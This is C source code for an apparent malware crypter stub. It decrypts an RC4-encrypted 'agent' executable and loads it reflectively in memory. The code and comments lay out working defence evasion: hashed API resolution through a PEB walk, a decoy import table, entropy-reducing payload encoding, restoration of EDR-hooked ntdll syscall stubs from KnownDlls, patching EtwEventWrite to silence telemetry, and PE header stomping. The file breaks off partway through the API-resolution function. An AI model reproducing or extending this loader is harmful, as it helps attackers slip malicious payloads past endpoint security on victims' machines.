/*
 * stub_loader.c — Polymorphic stub: decrypts and reflectively loads the agent PE.
 *
 * This file is compiled as a standalone .exe with -nostdlib and a custom
 * entry point (_stub_entry). There is NO CRT startup, NO standard library.
 *
 * The stub has a LEGITIMATE-LOOKING IAT with benign kernel32 imports
 * (GetSystemTimeAsFileTime, GetTickCount64, etc.) to avoid the zero-IAT
 * heuristic that flags packed/crypter binaries. These imports also serve
 * as API-based anti-emulation: each real API call costs an emulator ~1000x
 * more than an arithmetic instruction.
 *
 * Critical operations (memory allocation, protection changes) use
 * NtAllocateVirtualMemory / NtProtectVirtualMemory resolved via PEB walk
 * from ntdll, bypassing any kernel32-level hooks.
 *
 * Encryption: RC4 with key derived from a seed stored in stub_payload.h.
 * The actual RC4 key is never stored on disk.
 *
 * Build (handled by pe_crypt.py):
 *   x86_64-w64-mingw32-gcc -Os -s -nostdlib -Wl,-e,_stub_entry \
 *       -Wl,--subsystem,windows stub_loader.c -o agent.exe -lkernel32
 */

#include <windows.h>
#include <winnt.h>

/* ─── Generated per-build: encrypted payload + seed ─── */
#include "stub_payload.h"

/* ─── Evasion toggles ───
 *
 * UNHOOK and ETW must stay OFF in the stub.  Both patch ntdll BEFORE
 * the agent PE is loaded, which means BEFORE winhttp.dll, schannel.dll
 * and other DLLs run their DllMain.  Those DLLs need functional ntdll
 * (EtwEventWrite, unpatched syscall stubs) during initialisation;
 * patching first causes WinHttpSendRequest to hang indefinitely.
 *
 * The agent already does both in evasion_runtime.c AFTER all imports
 * are resolved and DLLs initialised — that is the correct timing.
 *
 * STOMP is safe here because it only touches the agent PE headers
 * after the load is complete.
 */
#define EVASION_STOMP   1   /* MZ/PE signature stomp — safe post-load  */
#define EVASION_UNHOOK  0   /* DO NOT ENABLE — breaks WinHTTP (see above) */
#define EVASION_ETW     0   /* DO NOT ENABLE — breaks WinHTTP (see above) */


/* ═══════════════════════════════════════════════════════════════════
 * PEB structures (mirrors the agent's api_resolve.c)
 * ═══════════════════════════════════════════════════════════════════ */

typedef struct _STUB_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} STUB_UNICODE_STRING;

typedef struct _STUB_PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} STUB_PEB_LDR_DATA;

typedef struct _STUB_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY              InLoadOrderLinks;
    LIST_ENTRY              InMemoryOrderLinks;
    LIST_ENTRY              InInitializationOrderLinks;
    PVOID                   DllBase;
    PVOID                   EntryPoint;
    ULONG                   SizeOfImage;
    STUB_UNICODE_STRING     FullDllName;
    STUB_UNICODE_STRING     BaseDllName;
} STUB_LDR_DATA_TABLE_ENTRY;


/* ═══════════════════════════════════════════════════════════════════
 * Hash functions
 * ═══════════════════════════════════════════════════════════════════ */

/* Custom XOR-rotate-multiply hash — case-insensitive for module names (wide char) */
static DWORD _hash_mod(const wchar_t *s, USHORT lenBytes) {
    DWORD h = 0x4E67C6A7;
    USHORT lenChars = lenBytes / sizeof(wchar_t);
    USHORT i = 0;
    while (i < lenChars) {
        DWORD c = (DWORD)s[i];
        if (c >= L'A' && c <= L'Z') c += 32;
        h ^= c;
        h = (h << 7) | (h >> 25);   /* rotate left 7 */
        h += c * 0xAB;
        i++;
    }
    return h;
}

/* Custom XOR-rotate-multiply hash — case-sensitive for function names (narrow) */
static DWORD _hash_func(const char *s) {
    DWORD h = 0x4E67C6A7;
    while (*s) {
        DWORD c = (unsigned char)*s++;
        h ^= c;
        h = (h << 7) | (h >> 25);
        h += c * 0xAB;
    }
    return h;
}


/* ═══════════════════════════════════════════════════════════════════
 * PEB walk API resolver
 * ═══════════════════════════════════════════════════════════════════ */

/* Resolve a function from a module's export table by hash */
static void *_resolve_export(BYTE *modBase, DWORD funcHash) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)modBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(modBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY *expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir->VirtualAddress || !expDir->Size) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(modBase + expDir->VirtualAddress);
    DWORD *names    = (DWORD *)(modBase + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(modBase + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(modBase + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fname = (const char *)(modBase + names[i]);
        if (_hash_func(fname) == funcHash)
            return (void *)(modBase + funcs[ordinals[i]]);
    }
    return NULL;
}

/* Walk PEB -> Ldr -> InMemoryOrderModuleList to find a module by hash.
 * PEB access obfuscated: read TEB via gs:0x30, then dereference +0x60
 * to reach PEB. Avoids the signature for direct gs:0x60 access. */
static BYTE *_find_module(DWORD modHash) {
    void *peb;
#if defined(_M_X64) || defined(__x86_64__)
    {
        void *teb;
        __asm__ volatile("mov %%gs:0x30, %0" : "=r"(teb));
        if (!teb) return NULL;
        peb = *(void **)((BYTE *)teb + 0x60);
    }
#else
    {
        void *teb;
        __asm__ volatile("mov %%fs:0x18, %0" : "=r"(teb));
        if (!teb) return NULL;
        peb = *(void **)((BYTE *)teb + 0x30);
    }
#endif

    if (!peb) return NULL;

#if defined(_M_X64) || defined(__x86_64__)
    STUB_PEB_LDR_DATA *ldr = *(STUB_PEB_LDR_DATA **)((BYTE *)peb + 0x18);
#else
    STUB_PEB_LDR_DATA *ldr = *(STUB_PEB_LDR_DATA **)((BYTE *)peb + 0x0C);
#endif

    if (!ldr) return NULL;

    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;

    while (entry != head) {
        STUB_LDR_DATA_TABLE_ENTRY *tableEntry =
            (STUB_LDR_DATA_TABLE_ENTRY *)((BYTE *)entry - sizeof(LIST_ENTRY));

        if (tableEntry->DllBase &&
            tableEntry->BaseDllName.Buffer &&
            tableEntry->BaseDllName.Length > 0)
        {
            DWORD hash = _hash_mod(
                tableEntry->BaseDllName.Buffer,
                tableEntry->BaseDllName.Length
            );

            if (hash == modHash)
                return (BYTE *)tableEntry->DllBase;
        }

        entry = entry->Flink;
    }
    return NULL;
}


/* ═══════════════════════════════════════════════════════════════════
 * Nibble decode — reverse of entropy-reduction encoding
 *
 * The payload is stored with each ciphertext byte split into two
 * bytes from the alphabet 'A'-'P' (0x41-0x50).  This keeps the
 * .data section at entropy ≈ 4.0 instead of ≈ 8.0, avoiding
 * EDR heuristics that flag high-entropy PE sections.
 *
 *   encoded[i*2]   = 0x41 + (byte >> 4)     high nibble
 *   encoded[i*2+1] = 0x41 + (byte & 0x0F)   low nibble
 * ═══════════════════════════════════════════════════════════════════ */

static void _nibble_decode(const unsigned char *encoded, unsigned int enc_len,
                           unsigned char *decoded) {
    unsigned int i = 0;
    while (i < enc_len) {
        unsigned char hi = encoded[i]     - 0x41;
        unsigned char lo = encoded[i + 1] - 0x41;
        decoded[i >> 1] = (unsigned char)((hi << 4) | lo);
        i += 2;
    }
}


/* ═══════════════════════════════════════════════════════════════════
 * RC4 stream cipher
 * ═══════════════════════════════════════════════════════════════════ */

static void _rc4_init(unsigned char *S, const unsigned char *key, unsigned int keylen) {
    unsigned int idx = 0;
    while (idx < 256) { S[idx] = (unsigned char)idx; idx++; }
    unsigned char j = 0;
    idx = 0;
    while (idx < 256) {
        j = (unsigned char)(j + S[idx] + key[idx % keylen]);
        /* XOR swap — different compiled pattern than temp-variable swap */
        if (idx != (unsigned int)j) {
            S[idx] ^= S[j]; S[j] ^= S[idx]; S[idx] ^= S[j];
        }
        idx++;
    }
}

static void _rc4_crypt(unsigned char *S, unsigned char *data, unsigned int datalen) {
    unsigned char i = 0, j = 0;
    unsigned int k = 0;
    while (k < datalen) {
        i = (unsigned char)(i + 1);
        j = (unsigned char)(j + S[i]);
        if (i != j) {
            S[i] ^= S[j]; S[j] ^= S[i]; S[i] ^= S[j];
        }
        data[k] ^= S[(unsigned char)(S[i] + S[j])];
        k++;
    }
}


/* ═══════════════════════════════════════════════════════════════════
 * Key derivation from seed (XOR-rotate-multiply expansion)
 * Must match _derive_key() in pe_crypt.py EXACTLY.
 * ═══════════════════════════════════════════════════════════════════ */

#define DERIVED_KEY_LEN 256

static void _derive_key(const unsigned char *seed, unsigned int seedlen,
                        unsigned char *key, unsigned int keylen) {
    unsigned int i = 0;
    while (i < keylen) {
        unsigned int h = 0x4E67C6A7;
        unsigned int block = i >> 2;
        unsigned int j = 0;
        while (j < seedlen) {
            unsigned int val = seed[j] + block;
            h ^= val;
            h = (h << 7) | (h >> 25);   /* rotate left 7 */
            h += val * 0xAB;
            j++;
        }
        key[i] = (unsigned char)(h & 0xFF);
        if (i + 1 < keylen) key[i + 1] = (unsigned char)((h >> 8) & 0xFF);
        if (i + 2 < keylen) key[i + 2] = (unsigned char)((h >> 16) & 0xFF);
        if (i + 3 < keylen) key[i + 3] = (unsigned char)((h >> 24) & 0xFF);
        i += 4;
    }
}


/* ═══════════════════════════════════════════════════════════════════
 * API hash constants
 * ═══════════════════════════════════════════════════════════════════ */

/* Module hashes (custom XOR-rotate-multiply) */
#define H_KERNEL32                  0x7643D89A
#define H_NTDLL                     0xB69D105B

/* Core API hashes (custom XOR-rotate-multiply) */
#define H_LoadLibraryA              0x65BE5612
#define H_GetProcAddress            0x1D95607A
#define H_VirtualAlloc              0x278A9D51
#define H_VirtualProtect            0xBA78D9D6
#define H_VirtualFree               0x83ED17A7
#define H_FlushInstructionCache     0xAE737616
#define H_GetCurrentProcess         0x0263090D
#define H_RtlAddFunctionTable       0x08163348
#define H_SetUnhandledExceptionFilter 0xD13544EE
#define H_TlsAlloc                  0xE6B68622
#define H_TlsSetValue               0xF109F6BC
#define H_ExitProcess               0x34CED0ED

/* Nt* API hashes — direct ntdll calls for reflective loader.
 * Bypasses kernel32 hooks; resolved via PEB walk at runtime. */
#define H_NtAllocateVirtualMemory   0x277E7AFC
#define H_NtProtectVirtualMemory    0x1AF70505
#define H_NtFreeVirtualMemory       0xD780C6BE

/* Nt* hashes for targeted unhooking — common EDR-hooked syscalls */
#define H_NtWriteVirtualMemory      0x6BFAF34A
#define H_NtCreateThreadEx          0x622557AD
#define H_NtMapViewOfSection        0x264EBEE4
#define H_NtOpenProcess             0x472594B2
#define H_NtQueueApcThread          0x62744EA3
#define H_NtReadVirtualMemory       0x157FF6A0
#define H_NtResumeThread            0x6C37B31E
#define H_NtCreateSection           0x8C0F55BA
#define H_NtOpenThread              0x121303C4
#define H_NtUnmapViewOfSection      0x70A2530C

/* Unhooking API hashes — ntdll-only clean-copy restoration via \KnownDlls */
#define H_NtOpenSection             0x8CD472F5
#define H_NtClose                   0x8178E005

/* ETW patching hash — blind EDR telemetry */
#define H_EtwEventWrite             0x50EF17B1

/* Debug API hashes — only used with STUB_DEBUG */
#define H_CreateFileA               0x7DCE10F7
#define H_WriteFile                 0x46CE0FF3
#define H_CloseHandle               0x15026950


/* ═══════════════════════════════════════════════════════════════════
 * Debug logging via PEB-resolved APIs (NO CRT, NO stdio)
 *
 * All logging uses CreateFileA/WriteFile resolved from kernel32
 * at runtime via PEB walk. Zero IAT footprint.
 * ═══════════════════════════════════════════════════════════════════ */

#ifdef STUB_DEBUG

typedef HANDLE (WINAPI *fnCreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fnWriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fnCloseHandle_t)(HANDLE);

static fnCreateFileA_t  _dbg_CreateFileA  = NULL;
static fnWriteFile_t    _dbg_WriteFile    = NULL;
static fnCloseHandle_t  _dbg_CloseHandle  = NULL;
static HANDLE           _dbg_hLog         = (HANDLE)-1;  /* INVALID_HANDLE_VALUE */

static void _dbg_init(BYTE *k32) {
    _dbg_CreateFileA = (fnCreateFileA_t)_resolve_export(k32, H_CreateFileA);
    _dbg_WriteFile   = (fnWriteFile_t)  _resolve_export(k32, H_WriteFile);
    _dbg_CloseHandle = (fnCloseHandle_t)_resolve_export(k32, H_CloseHandle);

    if (!_dbg_CreateFileA || !_dbg_WriteFile) return;

    /* Open log in a known location — no getenv() without CRT */
    _dbg_hLog = _dbg_CreateFileA(
        "C:\\Windows\\Temp\\stub_debug.log",
        FILE_APPEND_DATA,          /* Always append */
        FILE_SHARE_READ,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (_dbg_hLog != (HANDLE)-1) {
        DWORD w;
        _dbg_WriteFile(_dbg_hLog, "=== stub start ===\r\n", 20, &w, NULL);
    }
}

static void _dbg_close(void) {
    if (_dbg_hLog != (HANDLE)-1 && _dbg_CloseHandle) {
        DWORD w;
        if (_dbg_WriteFile)
            _dbg_WriteFile(_dbg_hLog, "=== stub end ===\r\n", 18, &w, NULL);
        _dbg_CloseHandle(_dbg_hLog);
        _dbg_hLog = (HANDLE)-1;
    }
}

/* String length without CRT */
static DWORD _slen(const char *s) {
    DWORD n = 0;
    while (s[n]) n++;
    return n;
}

static void _dbg_log(const char *msg) {
    if (_dbg_hLog == (HANDLE)-1 || !_dbg_WriteFile) return;
    DWORD w;
    _dbg_WriteFile(_dbg_hLog, msg, _slen(msg), &w, NULL);
    _dbg_WriteFile(_dbg_hLog, "\r\n", 2, &w, NULL);
}

static void _dbg_hex(const char *label, unsigned long long val) {
    if (_dbg_hLog == (HANDLE)-1 || !_dbg_WriteFile) return;
    /* Manual hex formatting — no sprintf without CRT */
    static const char hx[] = "0123456789ABCDEF";
    char buf[64];
    DWORD pos = 0;

    /* Copy label */
    while (*label && pos < 40) buf[pos++] = *label++;
    buf[pos++] = ':'; buf[pos++] = ' ';
    buf[pos++] = '0'; buf[pos++] = 'x';

    /* Convert value to hex (skip leading zeros) */
    int started = 0;
    for (int i = 60; i >= 0; i -= 4) {
        int nibble = (int)((val >> i) & 0xF);
        if (nibble || started || i == 0) {
            buf[pos++] = hx[nibble];
            started = 1;
        }
    }

    DWORD w;
    _dbg_WriteFile(_dbg_hLog, buf, pos, &w, NULL);
    _dbg_WriteFile(_dbg_hLog, "\r\n", 2, &w, NULL);
}

#define SLOG(msg)       _dbg_log(msg)
#define SHEX(label, v)  _dbg_hex(label, (unsigned long long)(v))
#else
#define SLOG(msg)       ((void)0)
#define SHEX(label, v)  ((void)0)
#endif


/* ═══════════════════════════════════════════════════════════════════
 * ntdll unhooking — restore clean .text from disk
 *
 * EDRs inline-hook ntdll functions (NtAllocateVirtualMemory, etc.)
 * by patching the first bytes to a JMP into their DLL. We read a
 * fresh copy of ntdll.dll from disk, find the .text section, and
 * overwrite the loaded (hooked) .text with the clean bytes.
 *
 * After this, all ntdll function calls bypass EDR hooks.
 *
 * Uses kernel32 file APIs (CreateFileA, CreateFileMappingA,
 * MapViewOfFile) which EDRs generally do not hook — they hook
 * the Nt* layer below.
 * ═══════════════════════════════════════════════════════════════════ */

/* ═══════════════════════════════════════════════════════════════════
 * Resolved API function pointer table
 *
 * Moved above evasion functions so _unhook_ntdll / _patch_etw can
 * accept RESOLVED_APIS* and use pGetProcAddress / pNtProtectVirtualMemory
 * (avoiding the forwarded-export crash from _resolve_export on Win10/11).
 * ═══════════════════════════════════════════════════════════════════ */

typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnVirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef BOOL    (WINAPI *fnFlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE  (WINAPI *fnGetCurrentProcess_t)(void);
typedef LPTOP_LEVEL_EXCEPTION_FILTER (WINAPI *fnSetUnhandledExceptionFilter_t)(LPTOP_LEVEL_EXCEPTION_FILTER);
typedef DWORD   (WINAPI *fnTlsAlloc_t)(void);
typedef BOOL    (WINAPI *fnTlsSetValue_t)(DWORD, LPVOID);
typedef void    (WINAPI *fnExitProcess_t)(UINT);

/* Nt* typedefs — direct ntdll calls bypass kernel32 hooks */
typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fnNtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);

#if defined(_M_X64) || defined(__x86_64__)
typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
#endif

typedef struct _RESOLVED_APIS {
    fnLoadLibraryA_t         pLoadLibraryA;
    fnGetProcAddress_t       pGetProcAddress;
    fnVirtualAlloc_t         pVirtualAlloc;
    fnVirtualProtect_t       pVirtualProtect;
    fnVirtualFree_t          pVirtualFree;
    fnFlushInstructionCache_t pFlushInstructionCache;
    fnGetCurrentProcess_t    pGetCurrentProcess;
    fnSetUnhandledExceptionFilter_t pSetUnhandledExceptionFilter;
    fnTlsAlloc_t             pTlsAlloc;
    fnTlsSetValue_t          pTlsSetValue;
    fnExitProcess_t          pExitProcess;
    /* Nt* APIs from ntdll — used for reflective loader memory ops */
    fnNtAllocateVirtualMemory_t pNtAllocateVirtualMemory;
    fnNtProtectVirtualMemory_t  pNtProtectVirtualMemory;
    fnNtFreeVirtualMemory_t     pNtFreeVirtualMemory;
#if defined(_M_X64) || defined(__x86_64__)
    fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
#endif
} RESOLVED_APIS;

/* ═══════════════════════════════════════════════════════════════════
 * ntdll unhooking — ZERO kernel32 dependency
 *
 * Uses \KnownDlls\ntdll.dll section object (mapped by the kernel at
 * boot) + ntdll-native APIs only.  This completely avoids the
 * forwarded-export problem: kernel32 APIs like CreateFileMappingA,
 * MapViewOfFile, CloseHandle are forwarded to kernelbase on Win10/11
 * and _resolve_export() cannot follow forwarding — it returns a
 * pointer to the forwarding STRING, calling it = instant crash.
 *
 * The KnownDlls section is an IMAGE mapping (same layout as loaded
 * ntdll), so RVAs from the loaded copy can be used directly as
 * offsets into the clean copy — no _rva_to_offset needed.
 * ═══════════════════════════════════════════════════════════════════ */

/* Ntdll API typedefs for unhooking — all native, never forwarded */
typedef NTSTATUS (NTAPI *fnNtOpenSection_t)(PHANDLE, ACCESS_MASK, PVOID /*POBJECT_ATTRIBUTES*/);
typedef NTSTATUS (NTAPI *fnNtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fnNtClose_t)(HANDLE);
/* NtUnmapViewOfSection and NtProtectVirtualMemory already typedef'd via RESOLVED_APIS */
typedef NTSTATUS (NTAPI *fnNtUnmapViewOfSection_t)(HANDLE, PVOID);

/* Minimal OBJECT_ATTRIBUTES + UNICODE_STRING for NtOpenSection */
typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UHOOK_UNICODE_STRING;

typedef struct {
    ULONG  Length;
    HANDLE RootDirectory;
    UHOOK_UNICODE_STRING *ObjectName;
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} UHOOK_OBJECT_ATTRIBUTES;

#define STUB_PATCH_SIZE 32   /* bytes to restore per syscall stub */
#define OBJ_CASE_INSENSITIVE 0x00000040

static void _unhook_ntdll(BYTE *ntdll_base, RESOLVED_APIS *api) {
    /*
     * TARGETED per-stub ntdll unhooking via KnownDlls.
     *
     * Maps a clean ntdll from the kernel KnownDlls section object,
     * walks its export table, and only restores individual Nt and Zw
     * syscall stubs that have been hooked (first bytes differ).
     *
     * Does NOT replace the entire .text section -- that would revert
     * Windows in-memory hotfixes and break WinHTTP networking.
     *
     * Uses only ntdll-native APIs -- zero kernel32 dependency,
     * so the forwarded-export problem does not apply.
     */

    /* Resolve ntdll APIs for KnownDlls mapping */
    fnNtOpenSection_t pNtOpenSection =
        (fnNtOpenSection_t)_resolve_export(ntdll_base, H_NtOpenSection);
    fnNtMapViewOfSection_t pNtMapViewOfSection =
        (fnNtMapViewOfSection_t)_resolve_export(ntdll_base, H_NtMapViewOfSection);
    fnNtUnmapViewOfSection_t pNtUnmapViewOfSection =
        (fnNtUnmapViewOfSection_t)_resolve_export(ntdll_base, H_NtUnmapViewOfSection);
    fnNtClose_t pNtClose =
        (fnNtClose_t)_resolve_export(ntdll_base, H_NtClose);

    if (!pNtOpenSection || !pNtMapViewOfSection ||
        !pNtUnmapViewOfSection || !pNtClose) {
        SLOG("[stub] unhook: failed to resolve ntdll mapping APIs");
        return;
    }

    /* Open \KnownDlls\ntdll.dll section object */
    wchar_t kdName[] = L"\\KnownDlls\\ntdll.dll";
    UHOOK_UNICODE_STRING us;
    us.Buffer        = kdName;
    us.Length         = (USHORT)(sizeof(kdName) - sizeof(wchar_t));
    us.MaximumLength = (USHORT)sizeof(kdName);

    UHOOK_OBJECT_ATTRIBUTES oa;
    oa.Length                   = sizeof(oa);
    oa.RootDirectory            = NULL;
    oa.ObjectName               = &us;
    oa.Attributes               = OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor       = NULL;
    oa.SecurityQualityOfService = NULL;

    HANDLE hSection = NULL;
    NTSTATUS st = pNtOpenSection(&hSection, SECTION_MAP_READ, &oa);
    if (st != 0 || !hSection) {
        SLOG("[stub] unhook: NtOpenSection failed");
        return;
    }

    /* Map the clean ntdll into our address space */
    PVOID pClean   = NULL;
    SIZE_T viewSize = 0;
    st = pNtMapViewOfSection(hSection, (HANDLE)(LONG_PTR)-1,
                              &pClean, 0, 0, NULL, &viewSize,
                              1 /*ViewShare*/, 0, PAGE_READONLY);
    if (st != 0 || !pClean) {
        pNtClose(hSection);
        SLOG("[stub] unhook: NtMapViewOfSection failed");
        return;
    }

    SLOG("[stub] unhook: clean ntdll mapped from KnownDlls");

    /* Parse the CLEAN ntdll's export directory */
    IMAGE_DOS_HEADER *dosClean = (IMAGE_DOS_HEADER *)pClean;
    IMAGE_NT_HEADERS *ntClean  = (IMAGE_NT_HEADERS *)
        ((BYTE *)pClean + dosClean->e_lfanew);

    IMAGE_DATA_DIRECTORY *expDir = &ntClean->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (!expDir->VirtualAddress || !expDir->Size) {
        pNtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, pClean);
        pNtClose(hSection);
        SLOG("[stub] unhook: no export directory in clean ntdll");
        return;
    }

    DWORD exportRVA  = expDir->VirtualAddress;
    DWORD exportSize = expDir->Size;

    IMAGE_EXPORT_DIRECTORY *pExports = (IMAGE_EXPORT_DIRECTORY *)
        ((BYTE *)pClean + exportRVA);

    DWORD *nameRVAs = (DWORD *)((BYTE *)pClean + pExports->AddressOfNames);
    WORD  *ordinals = (WORD  *)((BYTE *)pClean + pExports->AddressOfNameOrdinals);
    DWORD *funcRVAs = (DWORD *)((BYTE *)pClean + pExports->AddressOfFunctions);

    DWORD stubsRestored = 0;
    DWORD i;

    /* Walk every named export, restore only hooked syscall stubs */
    for (i = 0; i < pExports->NumberOfNames; i++) {
        const char *name = (const char *)((BYTE *)pClean + nameRVAs[i]);

        /* Only Nt* and Zw* exports are syscall stubs */
        if (!((name[0] == 'N' && name[1] == 't') ||
              (name[0] == 'Z' && name[1] == 'w')))
            continue;

        /* Skip NtdllDefWindowProc_ etc. — not syscall stubs */
        if (name[0] == 'N' && name[1] == 't' && name[2] == 'd')
            continue;

        DWORD funcRVA = funcRVAs[ordinals[i]];

        /* Skip forwarded exports (RVA within export directory) */
        if (funcRVA >= exportRVA && funcRVA < exportRVA + exportSize)
            continue;

        BYTE *pCleanFunc  = (BYTE *)pClean     + funcRVA;
        BYTE *pLoadedFunc = ntdll_base         + funcRVA;

        /* Verify syscall stub: clean starts with mov r10, rcx (4C 8B D1) */
        if (pCleanFunc[0] != 0x4C || pCleanFunc[1] != 0x8B || pCleanFunc[2] != 0xD1)
            continue;

        /* Compare first STUB_PATCH_SIZE bytes (no CRT — manual loop) */
        {
            int differs = 0;
            int j;
            for (j = 0; j < STUB_PATCH_SIZE; j++) {
                if (pLoadedFunc[j] != pCleanFunc[j]) { differs = 1; break; }
            }
            if (!differs) continue;
        }

        /* Hooked — restore via NtProtectVirtualMemory (no kernel32) */
        {
            PVOID pBase  = pLoadedFunc;
            SIZE_T pSize = STUB_PATCH_SIZE;
            ULONG oldProt;
            int j;

            st = api->pNtProtectVirtualMemory(
                     (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
                     PAGE_EXECUTE_READWRITE, &oldProt);
            if (st == 0) {
                for (j = 0; j < STUB_PATCH_SIZE; j++)
                    pLoadedFunc[j] = pCleanFunc[j];
                api->pNtProtectVirtualMemory(
                    (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
                    oldProt, &oldProt);
                stubsRestored++;
            }
        }
    }

    pNtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, pClean);
    pNtClose(hSection);

    SLOG(stubsRestored ? "[stub] unhook: syscall stubs restored"
                       : "[stub] unhook: no hooks detected");
}


/* ═══════════════════════════════════════════════════════════════════
 * ETW patching — blind EDR telemetry
 *
 * EDRs subscribe to ETW (Event Tracing for Windows) providers in
 * ntdll to receive telemetry about .NET loading, thread creation,
 * image loads, etc. Patching EtwEventWrite to immediately return 0
 * (STATUS_SUCCESS) silences this entire telemetry channel.
 *
 *   Before: EtwEventWrite → full event logging
 *   After:  EtwEventWrite → xor eax, eax; ret (3 bytes)
 * ═══════════════════════════════════════════════════════════════════ */

static void _patch_etw(BYTE *ntdll_base, RESOLVED_APIS *api) {
    /*
     * Patch EtwEventWrite to immediately return STATUS_SUCCESS.
     * Silences the ETW telemetry pipeline that feeds EDR sensors.
     *
     * x64 patch: xor rax, rax; ret  →  48 33 C0 C3
     *
     * Uses NtProtectVirtualMemory — zero kernel32 dependency.
     */
    BYTE *pFunc = (BYTE *)_resolve_export(ntdll_base, H_EtwEventWrite);
    if (!pFunc) {
        SLOG("[stub] etw: EtwEventWrite not found");
        return;
    }

    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };   /* xor rax, rax; ret */

    PVOID pBase  = pFunc;
    SIZE_T pSize = sizeof(patch);
    ULONG oldProt;

    NTSTATUS st = api->pNtProtectVirtualMemory(
                      (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
                      PAGE_EXECUTE_READWRITE, &oldProt);
    if (st != 0) {
        SLOG("[stub] etw: VirtualProtect failed");
        return;
    }

    /* Manual byte copy (no CRT) */
    pFunc[0] = patch[0];
    pFunc[1] = patch[1];
    pFunc[2] = patch[2];
    pFunc[3] = patch[3];

    api->pNtProtectVirtualMemory(
        (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
        oldProt, &oldProt);

    SLOG("[stub] etw: EtwEventWrite patched");
}


static BOOL _resolve_apis(RESOLVED_APIS *api) {
    SLOG("[stub] finding kernel32...");

    BYTE *k32 = _find_module(H_KERNEL32);
    if (!k32) {
        SLOG("[stub] FATAL: kernel32 not found via PEB walk");
        return FALSE;
    }

    SHEX("[stub] kernel32 base", (ULONG_PTR)k32);

    /* Initialize debug logging FIRST so we can log subsequent steps */
#ifdef STUB_DEBUG
    _dbg_init(k32);
    SLOG("[stub] debug logging initialized");
#endif

    api->pLoadLibraryA       = (fnLoadLibraryA_t)      _resolve_export(k32, H_LoadLibraryA);
    api->pGetProcAddress     = (fnGetProcAddress_t)     _resolve_export(k32, H_GetProcAddress);
    api->pVirtualAlloc       = (fnVirtualAlloc_t)       _resolve_export(k32, H_VirtualAlloc);
    api->pVirtualProtect     = (fnVirtualProtect_t)     _resolve_export(k32, H_VirtualProtect);
    api->pVirtualFree        = (fnVirtualFree_t)        _resolve_export(k32, H_VirtualFree);
    api->pFlushInstructionCache = (fnFlushInstructionCache_t)_resolve_export(k32, H_FlushInstructionCache);
    api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  _resolve_export(k32, H_GetCurrentProcess);
    api->pExitProcess        = (fnExitProcess_t)        _resolve_export(k32, H_ExitProcess);

    api->pSetUnhandledExceptionFilter = (fnSetUnhandledExceptionFilter_t)_resolve_export(k32, H_SetUnhandledExceptionFilter);
    api->pTlsAlloc    = (fnTlsAlloc_t)   _resolve_export(k32, H_TlsAlloc);
    api->pTlsSetValue = (fnTlsSetValue_t)_resolve_export(k32, H_TlsSetValue);

    SLOG("[stub] core APIs resolved");

    /* Resolve Nt* APIs from ntdll for reflective loader memory operations.
     * These bypass kernel32 hooks — critical for EDR evasion. */
    BYTE *ntdll = _find_module(H_NTDLL);
    if (ntdll) {
